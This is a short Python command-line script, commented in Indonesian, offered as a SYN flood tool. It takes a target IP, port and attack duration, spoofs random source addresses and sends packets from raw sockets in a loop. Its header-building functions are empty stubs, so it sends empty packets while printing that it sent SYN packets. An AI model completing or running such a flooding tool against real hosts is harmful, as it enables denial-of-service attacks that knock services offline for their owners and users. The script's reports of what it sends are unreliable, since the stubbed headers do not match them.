import socket
import random
import time
import argparse
import sys

# Fungsi untuk melakukan SYN Flooding
def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # Membuat IP source dan port source acak untuk spoofing
            src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            src_port = random.randint(1024, 7000)

            # Membuat socket dan mengirim paket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Membuat header IP dan TCP
            ip_header = create_ip_header(src_ip, target_ip)
            tcp_header = create_tcp_header(src_port, target_port)

            # Mengirim paket
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

        except Exception as e:
            print(f"Error sending packet: {e}")

def create_ip_header(src_ip, dest_ip):
    # Header IP sederhana untuk demonstrasi
    return b''

def create_tcp_header(src_port, dest_port):
    # Header TCP sederhana untuk demonstrasi
    return b''

# Fungsi untuk parsing argumen dari baris perintah
def parse_args():
    parser = argparse.ArgumentParser(description="Perform SYN Flood on a target IP.")
    parser.add_argument('ip', type=str, help="Target IP address")
    parser.add_argument('port', type=int, help="Target port number")
    parser.add_argument('duration', type=int, help="Duration of the attack in seconds")
    return parser.parse_args()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python p.py <ip> <port> <duration>")
        sys.exit(1)

    args = parse_args()
    syn_flood(args.ip, args.port, args.duration)
